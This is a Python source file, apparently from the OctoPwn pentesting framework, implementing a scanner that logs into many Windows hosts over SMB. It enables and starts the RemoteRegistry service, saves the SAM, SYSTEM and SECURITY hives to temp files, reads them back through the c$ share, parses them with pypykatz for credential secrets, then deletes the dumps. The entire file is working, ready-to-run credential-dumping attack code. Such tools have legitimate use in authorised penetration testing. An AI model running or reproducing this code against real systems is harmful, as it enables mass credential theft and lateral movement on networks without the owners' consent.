import traceback
import asyncio
import os
import copy
import platform
from typing import cast

from aiosmb.commons.connection.target import SMBTarget
from aiosmb.commons.connection.credential import SMBAuthProtocol
from aiosmb.commons.connection.url import SMBConnectionURL
from octopwn.clients.scannerbase import ScannerConsoleBase
from aiosmb.examples.scancommons.targetgens import ListTargetGen, FileTargetGen
from aiosmb.commons.interfaces.machine import SMBMachine
from pypykatz.registry.aoffline_parser import OffineRegistry
from pypykatz.alsadecryptor.asbmfile import SMBFileReader
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.dcerpc.v5.common.service import SMBServiceStatus

class EnumResult:
	def __init__(self, otype, oid, result):
		self.otype = otype
		self.oid = oid
		self.result = result

class SMBRegdumpScanner(ScannerConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ScannerConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj)
		self.nologon_commands.append('any')

		self.params = {
			'credential': (int, None),
			'targets' : (list, []),
			'targetfiles' : (list, []),
			'authtype': (str, 'NTLM'),
			'workercount' : (int,100),
			'srvwaittime' : (int,4),
			'output_type' : (str, 'tsv'),
			'proxy': (int, None),
			'resultsfile': (str, 'smb_scan_regdump_%s.txt' % os.urandom(4).hex())
		}

		self.enumerator_task = None
		self.monitor_task = None
		self.results_ctr = 0
		self.total_ctr = 0
	
	async def start(self):
		if platform.system().lower() == 'emscripten' and self.params['proxy'][1] is None:
			
			await self.do_setparam('proxy', 0)
		return True, None
	
	async def do_stop(self):
		try:
			self.enumerator_task.cancel()
			await self.print('[!] Scan stopped!')
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
		finally:
			self.scan_running = False

	async def __targetgen(self, targetqueue, target_gens):
		try:
			ctr = 0
			for targetgen in target_gens:
				async for tid, target, err in targetgen.generate():
					if err is not None:
						raise err
					ctr += 1
					await targetqueue.put((tid, target))
			return ctr, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def __enumexecutor(self, smb_mgr, targetqueue, resultqueue):
		try:
			while True:
				data = await targetqueue.get()
				if data is None:
					break
				tid, target = data
				connection = smb_mgr.create_connection_newtarget(target)
				async with connection:
					try:
						_, err = await connection.login()
						if err is not None:
							raise err

						machine = SMBMachine(connection)
						waittime = self.params['srvwaittime'][1] if self.params['srvwaittime'][1] is not None else 4
						hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY']
						remote_base_path = 'C:\\Windows\\Temp\\'
						remote_share_name = '\\c$\\Windows\\Temp\\'

						if remote_base_path.endswith('\\') is False:
							remote_base_path += '\\'

						if remote_share_name.endswith('\\') is False:
							remote_share_name += '\\'

						po = None

						await self.print('[%s] Checking remote registry service status...' % target)
						status, err = await machine.check_service_status('RemoteRegistry')
						if err is not None:
							raise err
								
						await self.print('[%s] Remote registry service status: %s' % (target, status.name))
						if status != SMBServiceStatus.RUNNING:
							await self.print('[%s] Enabling Remote registry service' % target)
							_, err = await machine.enable_service('RemoteRegistry')
							if err is not None:
								raise err
							await self.print('[%s] Starting Remote registry service' % target)
							_, err = await machine.start_service('RemoteRegistry')
							if err is not None:
								raise err
							await self.print('[%s] Waiting for RemoteRegistry service...' % target)
							await asyncio.sleep(waittime)

								
						await self.print('[%s] Remote registry service should be running now...' % target)
						files = {}
						for hive in hives:
							fname = '%s.%s' % (os.urandom(4).hex(), os.urandom(3).hex())
							remote_path = remote_base_path + fname
							remote_sharepath = remote_share_name + fname
							remote_file = SMBFileReader(SMBFile.from_remotepath(machine.connection, remote_sharepath))
							files[hive.split('\\')[1].upper()] = remote_file
									
							await self.print('[%s] Dumping reghive %s to (remote) %s' % (target, hive, remote_path))
							_, err = await machine.save_registry_hive(hive, remote_path)
							if err is not None:
								raise err
						
						await self.print('[%s] Waiting for regfile dump to be written to disk...' % target)
						await asyncio.sleep(waittime)
						
						for rfilename in files:
							rfile = files[rfilename]
							await self.print('[%s] Opening reghive file %s' % (target, rfilename))
							_, err = await rfile.open(machine.connection)
							if err is not None:
								raise err
								
						try:
							await self.print('[%s] Parsing hives...' % target)
							po = await OffineRegistry.from_async_reader(
								files['SYSTEM'], 
								sam_reader = files.get('SAM'), 
								security_reader = files.get('SECURITY'), 
								software_reader = files.get('SOFTWARE')
							)
						except Exception as e:
							await self.print('[%s] ERR! Failed to parse reghive files! Reason: %s' % (target, e))
						else:
							await self.print('[%s] Hives parsed OK!' % target)
								
						await self.print('[%s] Deleting remote files...' % target)
						err = None
						for rfilename in files:
							rfile = files[rfilename]
							err = await rfile.close()
							if err is not None:
								await self.print('[%s] ERR! Failed to close hive dump file! %s' % (target, rfilename))

							_, err = await rfile.delete()
							if err is not None:
								await self.print('[%s] ERR! Failed to delete hive dump file! %s' % (target, rfilename))
								
						if err is None:
							await self.print('[%s] Deleting remote files OK!' % target)
						
						await resultqueue.put(EnumResult('result', target, po)) 
					except Exception as e:
						await resultqueue.put(EnumResult('enumerror', target, e))
						continue

		except Exception as e:
			await self.print_exc(e, extra_msg=target)
			await resultqueue.put(EnumResult('error', None, e))
			return None, e

	async def __progress_printer(self):
		try:
			while True:
				await asyncio.sleep(2)
				if self.total_ctr is None or self.total_ctr == 0:
					await self.print('Dumping registry... %s hosts' % self.results_ctr)
				else:
					await self.print('Dumping registry... %s/%s (%%%s)' % (self.results_ctr, self.total_ctr, round((self.results_ctr/self.total_ctr)*100, 2)))
		except Exception as e:
			await self.print_exc(e)
			return

	async def __enumerator(self, smb_mgr, username_gens):
		try:
			self.results_ctr = 0
			self.total_ctr = 0
			resultqueue = asyncio.Queue()
			targetqueue = asyncio.Queue()

			progress_task = asyncio.create_task(self.__progress_printer())
			monitor_task = asyncio.create_task(self.__monitor_queue(resultqueue))
			enumexecutor_tasks = []
			usergen_task = asyncio.create_task(self.__targetgen(targetqueue, username_gens))
			for _ in range(self.params['workercount'][1]):
				enumexecutor_tasks.append(asyncio.create_task(self.__enumexecutor(smb_mgr, targetqueue, resultqueue)))
			self.total_ctr, err = await usergen_task #waiting for generators to finish
			if err is not None:
				raise err
			for _ in range(self.params['workercount'][1]):
				await targetqueue.put(None)
			await asyncio.wait(enumexecutor_tasks )
			await resultqueue.put(EnumResult('finished', None, None))
			await monitor_task


		except Exception as e:
			await self.print_exc(e)
			return None, e
		finally:
			progress_task.cancel()
			monitor_task.cancel()
			usergen_task.cancel()
			for t in enumexecutor_tasks:
				t.cancel()
	
	async def __monitor_queue(self, ext_result_q):
		try:
			outfile = None
			if self.params['resultsfile'][1] is not None and len(self.params['resultsfile'][1]) != 0:
				outfile = open(self.params['resultsfile'][1], 'a', newline = '')
			while True:
				await asyncio.sleep(0)
				data = await ext_result_q.get()
				data = cast(EnumResult, data)
				if data.otype == 'finished':
					break
				elif data.otype == 'enumerror':
					await self.print_exc(data.result, extra_msg=data.oid)
				elif data.otype == 'result':
					if data.result is not None:
						self.results_ctr += 1
						odata = ''
						for line in str(data.result).split('\n'):
							line=line.strip()
							odata += '[%s] %s\r\n' % (data.oid, line)
						if outfile is not None:
							outfile.write(odata + '\r\n')
							outfile.flush()
						else:
							await self.print(odata)
			
			await self.print('[+] Enum finished!')
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
		finally:
			self.scan_running = False
			if outfile is not None:
				outfile.close()


	async def do_scan(self):
		"""Start enumeration"""
		try:
			if self.scan_running is True:
				await self.print("Scan is still running. Can\'t start new scan here")
				return

			target_gens = []
			target = SMBTarget('999.999.999.999')
			if self.params['proxy'][1] is not None:
				tproxy = copy.deepcopy(self.octopwnobj.proxies[int(self.params['proxy'][1])])
				tproxy.wsnet_reuse = True
				target = tproxy.get_smb_proxy(target, self.octopwnobj.proxies)
			authtype = SMBAuthProtocol(self.params['authtype'][1])
			credential = self.octopwnobj.credentials[self.params['credential'][1]].get_smb_cred(authtype, target)
			smb_url = SMBConnectionURL(None, credential, target)
			
			
			for target in self.params['targetfiles'][1]:
				target_gens.append(FileTargetGen(target))
			
			target_gens.append(ListTargetGen(self.params['targets'][1]))
			self.enumerator_task = asyncio.create_task(self.__enumerator(smb_url, target_gens))
			self.scan_running = True
			await self.print('[+] Enum started!')
			if self.params['resultsfile'][1] is not None and len(self.params['resultsfile'][1]) != 0:
				await self.print('[+] Results will be written to: %s' % self.params['resultsfile'][1])
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	